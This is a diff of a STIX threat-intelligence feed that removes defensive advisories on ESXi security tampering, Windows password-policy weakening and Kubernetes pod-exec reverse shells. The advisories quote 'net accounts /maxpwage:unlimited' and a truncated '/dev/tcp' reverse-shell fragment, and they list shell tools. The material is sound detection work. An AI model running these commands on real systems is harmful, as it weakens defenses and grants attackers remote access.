-      "spec_version": "2.1",
-      "id": "report--c3bf019d-087b-538a-949a-696db0338e17",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:16.000Z",
-      "modified": "2026-08-24T15:46:16.000Z",
-      "name": "Modification of ESXi Security and Encryption Enforcement Settings",
-      "description": "## Overview\n\nThis alert addresses the modification of critical security and encryption enforcement settings on VMware ESXi hosts. Attackers, including those associated with Black Basta ransomware, have been observed targeting the configuration of hypervisors to weaken their security posture. By disabling features such as secure boot or executable verification requirements, threat actors can bypass integrity checks to execute unauthorized or malicious code directly within the hypervisor environment. This behavior is typically identified through the monitoring of ESXi system logs where configuration commands are audited. Defenders should prioritize alerting on these modifications as they are often a precursor to further post-compromise activity, including payload deployment and persistent control over virtual infrastructure.\n\n## Impact\n\nSuccessful modification of ESXi security settings grants an attacker the ability to bypass hypervisor protections, potentially leading to unauthorized execution of malicious binaries, persistence within the virtualization layer, and increased risk of widespread ransomware deployment across virtualized guest environments. This technique directly undermines the isolation guarantees of the hypervisor.\n\n## Recommendation\n\n* Ingest VMware ESXi syslog data into the SIEM and ensure the appropriate Technology Add-on for VMware ESXi is configured to extract relevant command-line fields.\n* Monitor for the specific command-line arguments identified in the detection logic below to identify attempts to lower the security threshold of ESXi hosts.\n* Investigate any alert triggered by these rules with high priority, as legitimate administrative changes to security settings on production ESXi hosts should be infrequent and managed through change control.\n",
-      "published": "2026-08-24T15:46:16.000Z",
-      "object_refs": [
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "software--a4e435a2-21e4-5a0c-87a3-22bdb661eaa1"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-esxi-encryption-modification",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-esxi-encryption-modification/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://github.com/splunk/security_content/blob/main/detections/application/esxi_encryption_settings_modified.yml"
-        }
-      ],
-      "confidence": 80,
-      "x_craftedsignal_brief_id": "brief-2026-08-esxi-encryption-modification",
-      "x_craftedsignal_event_id": "brief-2026-08-esxi-encryption-modification",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-esxi-encryption-modification/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:46:16.000Z",
-      "x_craftedsignal_severity": "high",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
       "x_craftedsignal_kev_status": "unknown"
     },
     {
@@ -29978,49 +29160,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--de98bf40-44ca-5389-b1db-9fe277f2f62c",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:45.000Z",
-      "modified": "2026-08-24T15:46:45.000Z",
-      "name": "Windows Password Policy Modification to Unlimited via Net.exe",
-      "description": "## Overview\n\nAdversaries and commodity malware frequently leverage the built-in Windows `net.exe` or `net1.exe` utilities to weaken security posture during post-exploitation activities. By executing the command `net accounts /maxpwage:unlimited`, an attacker forces the local or domain password policy to stop enforcing expiration requirements. This prevents security controls like forced password rotations from invalidating credentials that the attacker has compromised. This technique is often observed as part of a persistence mechanism, allowing the actor to maintain stable access to a victim's account for extended periods without needing to re-authenticate or re-compromise the user. Defenders should treat this command as a high-fidelity indicator of credential maintenance activity rather than routine administrative work, as such policy modifications are rarely performed in production environments.\n\n## Attack Chain\n\n1. Initial compromise of a host, often through credential dumping or malicious payload execution.\n2. Execution of a shell or command-line interface (e.g., cmd.exe, powershell.exe) by the malicious process.\n3. The malicious process invokes `net.exe` or `net1.exe` using a child process creation event.\n4. The attacker passes the arguments `accounts` followed by `/maxpwage:unlimited` to the utility.\n5. The Windows Service Control Manager or Netlogon service processes the request to update the SAM or Active Directory object policy.\n6. The system configuration is updated to ignore expiration intervals for user accounts.\n7. The attacker maintains long-term, uninterrupted access to the account, bypassing organizational password rotation requirements.\n\n## Impact\n\nSuccessful execution of this command results in a weakened security posture by disabling mandatory password rotation. This allows attackers to maintain persistence on compromised accounts for an indefinite period, increasing the risk of data exfiltration and further lateral movement. This activity is frequently associated with ransomware operators and crypto-stealing malware attempting to lock in access to infected environments.\n\n## Recommendation\n\n1. Deploy the provided Sigma rule to detect the execution of `net accounts` with the `maxpwage` parameter.\n2. Implement auditing for process creation events (Event ID 4688 or Sysmon Event ID 1) that include command-line arguments to ensure visibility into the full utility path and parameters.\n3. Investigate any instances of `net.exe` spawning from non-administrative processes or unexpected parent binaries (e.g., malware droppers).\n4. Use the `drilldown_searches` provided in security monitoring platforms to review the history of affected endpoints and identify related malicious activity, such as risk events from the preceding 7 days.\n",
-      "published": "2026-08-24T15:46:45.000Z",
-      "object_refs": [
-        "attack-pattern--bcb7aac1-0720-51b7-a9c7-65d3bf929d34",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "software--10d92f73-8f68-5d0c-81db-df1f19e85e2d"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-password-policy-unlimited",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-password-policy-unlimited/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-password-policy-unlimited",
-      "x_craftedsignal_event_id": "brief-2026-08-password-policy-unlimited",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-password-policy-unlimited/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:46:45.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--e0ae5ef6-6c9f-5216-a309-d21edcd7467c",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-26T20:20:57.000Z",
@@ -31249,61 +30388,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--ef1aaeac-0353-5301-aca8-cbd48c568184",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:49.000Z",
-      "modified": "2026-08-24T15:47:49.000Z",
-      "name": "Detection of Malicious Reverse Shell Patterns in Kubernetes Pod Exec Requests",
-      "description": "## Overview\n\nThis threat brief focuses on detecting unauthorized interactive access within Kubernetes clusters via the 'exec' subresource. Threat actors often leverage the Kubernetes API to execute commands within running containers to establish persistent or interactive command-and-control channels. The analyzed detection logic monitors Kubernetes audit logs for specific command-line idioms associated with reverse and bind shells, such as the use of `/dev/tcp`, `netcat`, `socat`, and various scripting language socket libraries. This behavior is a common indicator of post-exploitation movement where an attacker, having gained access to the Kubernetes API, attempts to escalate their foothold by transitioning from a single container execution to a persistent shell session. Defenders should monitor for these patterns to identify unauthorized container administration and potential command-and-control activity.\n\n## Attack Chain\n\n1. Attacker gains authentication to the Kubernetes API server (e.g., via compromised kubeconfig, service account token, or SSRF).\n2. Attacker performs enumeration to identify pods and containers within the cluster.\n3. Attacker identifies a target container for exploitation.\n4. Attacker invokes the `kubectl exec` command or makes a direct REST API call to the pod's 'exec' subresource.\n5. The API request URI is crafted to include a shell payload (e.g., `bash -i \u003e\u0026 /dev/tcp/...`).\n6. The container executes the malicious payload, which initiates an outbound connection to an attacker-controlled listener.\n7. A reverse shell is established, granting the attacker interactive access to the container environment.\n8. Attacker proceeds to lateral movement or data exfiltration from the compromised container.\n\n## Impact\n\nSuccessful exploitation allows for unauthorized interactive shell access to containerized workloads, enabling attackers to execute arbitrary code, steal secrets from the container filesystem or environment variables, and facilitate lateral movement throughout the cluster. Impact can range from individual workload compromise to full cluster persistence depending on the privileges assigned to the accessed pod or service account.\n\n## Recommendation\n\n- Implement the detection logic described in the provided audit rule to monitor for suspicious command patterns within `exec` requests.\n- Review all users and service accounts with the ability to execute commands in pods (pods/exec permissions) and enforce the principle of least privilege.\n- Baseline authorized container image commands and block unauthorized binaries like `socat` or `nc` from being executed in production containers.\n- Enable Kubernetes API Server Audit logging to a centralized SIEM to provide the telemetry required for detecting these 'exec' patterns.\n- Deploy automated responses to terminate suspicious `exec` sessions identified by the monitoring logic.\n",
-      "published": "2026-08-24T15:47:49.000Z",
-      "labels": [
-        "cloud",
-        "command-and-control",
-        "detection",
-        "execution",
-        "kubernetes"
-      ],
-      "object_refs": [
-        "attack-pattern--bd875342-0c00-5eaf-9fc6-290ea891ae27",
-        "attack-pattern--e6e63efe-42b5-57bd-b4b7-a8415ab979eb",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "software--84749115-8769-525a-a86c-6be2d5067e1d"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-k8s-pod-exec-reverse-shell",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-pod-exec-reverse-shell/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://attack.mitre.org/techniques/T1059/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://attack.mitre.org/techniques/T1609/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/kubernetes/execution_kubernetes_pod_exec_potential_reverse_shell.toml"
-        }
-      ],
-      "confidence": 80,
-      "x_craftedsignal_brief_id": "brief-2026-08-k8s-pod-exec-reverse-shell",
-      "x_craftedsignal_event_id": "brief-2026-08-k8s-pod-exec-reverse-shell",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-k8s-pod-exec-reverse-shell/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:47:49.000Z",
-      "x_craftedsignal_severity": "high",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--f08ce54d-98d6-583a-8cbb-3389462421a7",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-31T15:58:02.000Z",
@@ -32378,12 +31462,6 @@
     {
       "type": "software",
       "spec_version": "2.1",
-      "id": "software--0cacc068-9bc4-5c3f-8369-fce9ee1c1593",
-      "name": "apache_tomcat"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
       "id": "software--0cdc9f51-1a58-5693-a411-42fffce86514",
       "name": "Flowise"
     },
@@ -32845,12 +31923,6 @@
     {
       "type": "software",
       "spec_version": "2.1",
-      "id": "software--2f2208c4-4258-54d8-9c45-23af6a88707c",
-      "name": "GCP Metadata Server"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
       "id": "software--2f52711d-2309-511e-897d-08272f629b7a",
       "name": "Shuffle",
       "vendor": "Edge-Themes"
@@ -32874,12 +31946,6 @@
       "spec_version": "2.1",
       "id": "software--30a733e9-f616-5064-a421-8bfa11c08049",
       "name": "BioTime"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
-      "id": "software--321aea8e-61a5-5f48-9647-32e3772dee58",
-      "name": "nginx"
     },
     {
       "type": "software",
@@ -33436,12 +32502,6 @@
     {
       "type": "software",
       "spec_version": "2.1",
-      "id": "software--54780e80-06d8-5262-9407-cc232a75a07f",
-      "name": "traefik"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
       "id": "software--54b15b01-ead4-5add-9bc1-5f8ff3782263",
       "name": "print-lib (3.0.0-3.28.29, 3.29.0-3.30.31, 3.32.0-3.33.15, 3.34.0-4.0.4)",
       "vendor": "MapFish"
@@ -33896,12 +32956,6 @@
     {
       "type": "software",
       "spec_version": "2.1",
-      "id": "software--6f49ad8d-6cd3-5a0a-96a6-3fccea667096",
-      "name": "apache"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
       "id": "software--6fce20a8-03ca-56d9-bf06-df9daea2af24",
       "name": "yamcs-core (\u003c 5.11.13)",
       "vendor": "Yamcs"
@@ -34256,13 +33310,6 @@
     {
       "type": "software",
       "spec_version": "2.1",
-      "id": "software--84749115-8769-525a-a86c-6be2d5067e1d",
-      "name": "Kubernetes",
-      "vendor": "Kubernetes"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
       "id": "software--84fd15a5-45ea-5ae0-a4c6-fd1e00284698",
       "name": "Adminer (\u003c= 5.4.3)",
       "vendor": "Vrana"
@@ -34466,12 +33513,6 @@
       "id": "software--913473c0-a898-5a78-91c5-3b99b72d4ca5",
       "name": "ToolJet (\u003c 3.16.208)",
       "vendor": "ToolJet"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
-      "id": "software--92d0dbed-61d9-5af0-bb63-dbd0104c8afa",
-      "name": "iis"
     },
     {
       "type": "software",
@@ -34697,12 +33738,6 @@
     {
       "type": "software",
       "spec_version": "2.1",
-      "id": "software--a1521327-ec2c-5d93-894b-4efdbd58fc92",
-      "name": "zeek"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
       "id": "software--a2b8a13a-2046-5386-a893-104ea5062b5d",
       "name": "Ech0",
       "vendor": "lin-snow"
@@ -34734,13 +33769,6 @@
       "id": "software--a4a1150a-fb24-5f99-851b-411577144869",
       "name": "Dolibarr",
       "vendor": "Dolibarr"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
-      "id": "software--a4e435a2-21e4-5a0c-87a3-22bdb661eaa1",
-      "name": "ESXi",
-      "vendor": "VMware"
     },
     {
       "type": "software",
@@ -35553,12 +34581,6 @@
     {
       "type": "software",
       "spec_version": "2.1",
-      "id": "software--da9a48da-4482-5a99-8bcd-dccfef835054",
-      "name": "AWS IMDS"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
       "id": "software--db16db7d-9779-5cd0-9684-73ac760a4ca8",
       "name": "Archer BE800",
       "vendor": "TP-Link"
@@ -35717,12 +34739,6 @@
       "id": "software--e3b2c6ae-90e9-508e-baba-7d68e48112f9",
       "name": "Jawn",
       "vendor": "MVPThemes"
-    },
-    {
-      "type": "software",
-      "spec_version": "2.1",
-      "id": "software--e778ce89-de06-530b-805f-85bc5a5049e2",
-      "name": "Azure Instance Metadata Service"
     },
     {
       "type": "software",
